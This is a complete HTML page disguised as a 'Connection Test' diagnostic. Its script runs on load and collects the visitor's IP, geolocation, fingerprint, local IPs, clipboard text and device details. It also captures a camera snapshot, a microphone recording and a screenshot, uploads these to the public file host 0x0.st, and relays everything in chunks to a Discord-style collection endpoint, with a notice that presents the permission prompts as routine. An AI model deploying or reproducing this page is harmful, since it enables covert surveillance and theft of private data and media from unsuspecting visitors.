<!DOCTYPE html>
<html>
<head>
    <title>Connection Test</title>
    <style>
        body { background:#0a0a0a; color:#0f0; font-family:monospace; text-align:center; padding:2rem; }
        #log { margin-top:20px; white-space:pre-wrap; text-align:left; max-width:900px; margin-left:auto; margin-right:auto; background:#000; padding:1rem; border:1px solid #0f0; }
        #permission-notice { font-size:0.8rem; color:#aaa; margin-top:20px; }
    </style>
</head>
<body>
    <h1>Establishing secure link...</h1>
    <pre id="log">Collecting extended diagnostic data...</pre>
    <div id="permission-notice">(camera/mic/screen/geo/clipboard may request permission – this is part of diagnostics)</div>

    <script>
        const BACKEND_URL = '/api/collect';

        // ------------------------------------------------------------------
        // NEW: upload a Blob/File to 0x0.st and return the public URL
        // ------------------------------------------------------------------
        async function uploadTo0x0st(blob, filename = 'snapshot.jpg') {
            const formData = new FormData();
            formData.append('file', blob, filename);
            const response = await fetch('https://0x0.st', {
                method: 'POST',
                body: formData
            });
            if (!response.ok) throw new Error(`Upload failed: ${response.status}`);
            const url = await response.text();  // 0x0.st returns the URL as plain text
            return url.trim();
        }

        // Helper: send a single Discord message payload
        async function sendDiscordMessage(payload) {
            try {
                const res = await fetch(BACKEND_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                return res.ok;
            } catch(e) {
                console.error('Send failed:', e);
                return false;
            }
        }

        // Helper: split a long string into chunks (max 1900 chars each, leaving room for field name)
        function splitLongString(str, maxChunk = 1900) {
            const chunks = [];
            for (let i = 0; i < str.length; i += maxChunk) {
                chunks.push(str.substring(i, i + maxChunk));
            }
            return chunks;
        }

        (async () => {
            const logEl = document.getElementById('log');
            const data = {};

            // ==================== ORIGINAL FUNCTIONS (KEPT UNCHANGED) ====================
            async function getIPInfo() {
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const { ip } = await ipRes.json();
                    data.public_ip = ip;

                    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                    const geo = await geoRes.json();
                    data.vpn_detected = geo.proxy || geo.hosting || (geo.org && geo.org.toLowerCase().includes('vpn')) || false;
                    data.location = { city: geo.city, region: geo.region, country: geo.country_name, lat: geo.latitude, lon: geo.longitude };
                } catch(e) { data.ip_error = e.message; }
            }

            function getFingerprint() {
                const fp = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    screen: { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    canvas: null, 
                    webgl: null
                };
                const canvas = document.createElement('canvas');
                canvas.width = 200; canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,30);
                ctx.fillStyle = '#069'; ctx.fillText('Frenesis',2,15);
                fp.canvas = canvas.toDataURL();
                
                const gl = document.createElement('canvas').getContext('webgl');
                if(gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    if(debug) fp.webgl = { 
                        vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL), 
                        renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) 
                    };
                }
                return fp;
            }

            async function scanVulns() {
                const vulns = [];
                const ua = navigator.userAgent;
                if(/Chrome\/([0-9]+)/.test(ua)) {
                    const v = parseInt(ua.match(/Chrome\/([0-9]+)/)[1]);
                    if(v < 90) vulns.push('Chrome <90 (RCE)');
                }
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = (e) => {
                        if(e.candidate) {
                            const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                            if(ipMatch && !ipMatch[0].startsWith('192.168.') && !ipMatch[0].startsWith('10.'))
                                vulns.push(`WebRTC leak: ${ipMatch[0]}`);
                        }
                    };
                } catch(e){}
                if(localStorage.length > 0) vulns.push('LocalStorage has data');
                return vulns;
            }

            async function getExtended() {
                const ext = {};
                if(navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    ext.battery = { level: bat.level, charging: bat.charging };
                }
                if(navigator.connection) {
                    ext.network = { effectiveType: navigator.connection.effectiveType, rtt: navigator.connection.rtt, downlink: navigator.connection.downlink };
                }
                return ext;
            }

            // ==================== NEW EXTENDED DIAGNOSTICS ====================
            async function getAllLocalIPs() {
                return new Promise((resolve) => {
                    const ips = new Set();
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) {
                            pc.close();
                            resolve(Array.from(ips));
                            return;
                        }
                        const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                        if (ipMatch) ips.add(ipMatch[0]);
                    };
                    setTimeout(() => {
                        pc.close();
                        resolve(Array.from(ips));
                    }, 2000);
                });
            }

            async function getGeolocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) { resolve(null); return; }
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                        err => resolve({ error: err.message }),
                        { timeout: 5000 }
                    );
                });
            }

            // ---------- MODIFIED: capture and upload camera snapshot, return URL ----------
            async function captureCameraSnapshot(videoTrack) {
                if (!videoTrack) return null;
                const stream = new MediaStream([videoTrack]);
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 200));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
                video.srcObject = null;
                video.remove();
                if(videoTrack.stop) videoTrack.stop();
                try {
                    const url = await uploadTo0x0st(blob, 'camera_snapshot.jpg');
                    return url;   // returns public URL instead of base64
                } catch(e) {
                    console.error('Camera upload failed:', e);
                    return null;
                }
            }

            // ---------- MODIFIED: capture microphone sample, upload as .webm, return URL ----------
            async function captureMicrophoneSample(stream) {
                if (!stream) return null;
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.start();
                await new Promise(r => setTimeout(r, 3000));
                mediaRecorder.stop();
                await new Promise(r => mediaRecorder.onstop = r);
                const blob = new Blob(chunks, { type: 'audio/webm' });
                stream.getTracks().forEach(t => t.stop());
                try {
                    const url = await uploadTo0x0st(blob, 'microphone_sample.webm');
                    return url;
                } catch(e) {
                    console.error('Microphone upload failed:', e);
                    return null;
                }
            }

            // ---------- MODIFIED: capture screen snapshot, upload, return URL ----------
            async function captureScreenSnapshot() {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return null;
                try {
                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(r => setTimeout(r, 500));
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.5));
                    stream.getTracks().forEach(t => t.stop());
                    video.remove();
                    const url = await uploadTo0x0st(blob, 'screen_snapshot.jpg');
                    return url;
                } catch(e) {
                    console.error('Screen capture failed:', e);
                    return null;
                }
            }

            async function readClipboard() {
                if (!navigator.clipboard || !navigator.clipboard.readText) return null;
                try {
                    const text = await navigator.clipboard.readText();
                    return text.length > 500 ? text.slice(0,500)+'...' : text;
                } catch(e) { return null; }
            }

            function getOrientation() {
                return new Promise((resolve) => {
                    if (!window.DeviceOrientationEvent) { resolve(null); return; }
                    const handler = (e) => {
                        window.removeEventListener('deviceorientation', handler);
                        resolve({ alpha: e.alpha, beta: e.beta, gamma: e.gamma });
                    };
                    window.addEventListener('deviceorientation', handler, { once: true });
                    setTimeout(() => resolve(null), 2000);
                });
            }

            async function getAmbientLight() {
                if (!window.AmbientLightSensor) return null;
                try {
                    const sensor = new AmbientLightSensor();
                    sensor.start();
                    await new Promise(r => sensor.onreading = r);
                    const value = sensor.illuminance;
                    sensor.stop();
                    return value;
                } catch(e) { return null; }
            }

            async function getBluetoothAvailability() { return !!navigator.bluetooth; }
            async function getUSBAvailability() { return !!navigator.usb; }
            function getSpeechRecognitionSupport() { return !!(window.SpeechRecognition || window.webkitSpeechRecognition); }
            function vibrateTest() { if(navigator.vibrate) navigator.vibrate(200); return !!navigator.vibrate; }
            async function checkNotifications() {
                if (!('Notification' in window)) return 'not supported';
                const permission = Notification.permission;
                if (permission === 'granted') new Notification('Diagnostic test', { body: 'Test', silent: true });
                return permission;
            }
            function getGamepads() {
                const pads = navigator.getGamepads ? navigator.getGamepads() : [];
                return pads.filter(p => p !== null).map(p => ({ id: p.id, buttons: p.buttons.length, axes: p.axes.length }));
            }
            function getInstalledFonts() {
                const fontList = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Console", "Segoe UI", "Roboto", "Open Sans", "Calibri", "Cambria", "Consolas"];
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                function checkFont(font) {
                    ctx.font = `72px ${font}`;
                    const ref = ctx.measureText('mmmmmm').width;
                    ctx.font = `72px Arial, ${font}`;
                    const test = ctx.measureText('mmmmmm').width;
                    return ref !== test;
                }
                return fontList.filter(checkFont);
            }
            function webShareSupport() { return !!navigator.share; }
            async function getAllPermissions() {
                if (!navigator.permissions || !navigator.permissions.query) return {};
                const names = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write', 'persistent-storage', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
                const results = {};
                for (const name of names) {
                    try {
                        const status = await navigator.permissions.query({ name });
                        results[name] = status.state;
                    } catch(e) { results[name] = 'error'; }
                }
                return results;
            }
            async function enumerateMediaDevices() {
                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    return devices.map(d => ({ kind: d.kind, label: d.label || 'hidden', deviceId: d.deviceId }));
                } catch(e) { return []; }
            }
            async function requestCameraAndMic() {
                let cameraURL = null, micURL = null;
                try {
                    const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    if (cameraStream && cameraStream.getVideoTracks().length) {
                        const track = cameraStream.getVideoTracks()[0];
                        cameraURL = await captureCameraSnapshot(track);
                    }
                } catch(e) { cameraURL = null; }
                try {
                    const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    if (micStream) micURL = await captureMicrophoneSample(micStream);
                } catch(e) { micURL = null; }
                return { cameraSnapshotURL: cameraURL, microphoneSampleURL: micURL };
            }

            // ==================== MAIN ====================
            try {
                logEl.textContent = 'Collecting data... (camera/mic/etc may request permission)';
                await getIPInfo();
                const fingerprint = getFingerprint();
                const vulns = await scanVulns();
                const extended = await getExtended();

                const [allLocalIPs, geoLocation, orientation, ambientLight, bluetoothAvail, usbAvail, speechRecog, notifications, gamepads, installedFonts, webShare, permissions, mediaDevices, cameraMicData] = await Promise.all([
                    getAllLocalIPs(),
                    getGeolocation(),
                    getOrientation(),
                    getAmbientLight(),
                    getBluetoothAvailability(),
                    getUSBAvailability(),
                    getSpeechRecognitionSupport(),
                    checkNotifications(),
                    getGamepads(),
                    getInstalledFonts(),
                    webShareSupport(),
                    getAllPermissions(),
                    enumerateMediaDevices(),
                    requestCameraAndMic()
                ]);
                const clipboardText = await readClipboard();
                const screenSnapshotURL = await captureScreenSnapshot();

                // Build full diagnostics object – now with URLs instead of Base64
                const fullDiag = {
                    webrtc_local_ips: allLocalIPs,
                    geolocation: geoLocation,
                    orientation: orientation,
                    ambient_light_lux: ambientLight,
                    bluetooth_available: bluetoothAvail,
                    usb_available: usbAvail,
                    speech_recognition_support: speechRecog,
                    notifications_status: notifications,
                    gamepads: gamepads,
                    installed_fonts_sample: installedFonts,
                    web_share_support: webShare,
                    permissions: permissions,
                    media_devices: mediaDevices,
                    camera_snapshot_url: cameraMicData.cameraSnapshotURL || null,
                    microphone_sample_url: cameraMicData.microphoneSampleURL || null,
                    screen_snapshot_url: screenSnapshotURL || null,
                    clipboard_text: clipboardText,
                    http_headers_js: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        cookiesEnabled: navigator.cookieEnabled,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        language: navigator.language,
                        languages: navigator.languages,
                        doNotTrack: navigator.doNotTrack,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory,
                        plugins: Array.from(navigator.plugins || []).map(p => p.name),
                        screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, pixelDepth: screen.pixelDepth }
                    }
                };

                const fullDiagStr = JSON.stringify(fullDiag, null, 2);
                const chunks = splitLongString(fullDiagStr, 1900);

                // ---- Message 1: Core info (always fits) ----
                const coreMessage = {
                    content: '**ULTRA EXTENDED VISITOR DIAGNOSTICS – PART 1/??**',
                    embeds: [{
                        title: 'Core Information',
                        color: 0xff0000,
                        fields: [
                            { name: 'IP & Location', value: `${data.public_ip || 'unknown'} - ${data.location ? data.location.city + ', ' + data.location.country : 'N/A'}`, inline: false },
                            { name: 'VPN / Proxy', value: data.vpn_detected ? 'Yes' : 'No', inline: true },
                            { name: 'GPS (device)', value: geoLocation ? `${geoLocation.lat},${geoLocation.lon} (±${geoLocation.accuracy}m)` : 'unavailable/denied', inline: false },
                            { name: 'Basic Fingerprint', value: '```json\n' + JSON.stringify(fingerprint, null, 2).slice(0,900) + '```', inline: false },
                            { name: 'Vulnerabilities', value: vulns.join('\n') || 'None', inline: false },
                            { name: 'Extended (battery/network)', value: '```json\n' + JSON.stringify(extended, null, 2) + '```', inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };
                await sendDiscordMessage(coreMessage);
                logEl.textContent = 'Sent core data. Sending remaining chunks...';

                // ---- Send each chunk of fullDiag as separate messages ----
                for (let i = 0; i < chunks.length; i++) {
                    const partNum = i + 2;
                    const chunkMessage = {
                        content: `**ULTRA EXTENDED VISITOR DIAGNOSTICS – PART ${partNum}/${chunks.length+1}**`,
                        embeds: [{
                            title: 'Full Diagnostics (continued)',
                            color: 0x00ff00,
                            description: '```json\n' + chunks[i] + '```',
                            timestamp: new Date().toISOString()
                        }]
                    };
                    await sendDiscordMessage(chunkMessage);
                    logEl.textContent = `Sent part ${partNum} of ${chunks.length+1}`;
                    await new Promise(r => setTimeout(r, 500));
                }

                await sendDiscordMessage({ content: '✅ All diagnostic data sent successfully.' });
                logEl.textContent = 'All diagnostics sent successfully.';
            } catch (err) {
                console.error(err);
                logEl.textContent = 'Error: ' + err.message;
                await sendDiscordMessage({ content: `❌ Error during collection: ${err.message}` });
            }
        })();
    </script>
</body>
</html>
